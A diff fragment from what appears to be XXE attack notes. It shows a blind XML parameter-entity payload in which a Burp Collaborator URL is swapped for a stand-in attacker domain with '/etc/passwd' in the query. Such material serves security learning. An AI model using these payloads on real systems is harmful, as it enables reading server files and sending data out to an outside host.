@@ -50,7 +50,7 @@ Sometimes, XXE attacks using regular entities are blocked, due to some input val
 Blind Injection via ```XML parameter entities```.
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://lzo0rtwgk8xcsit88fj9qc8wun0eo8cx.oastify.com"> %xxe; ]>
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://attacker-doamin.com/?x=/etc/passwd"> %xxe; ]>
     <stockCheck>
         <productId>
             1
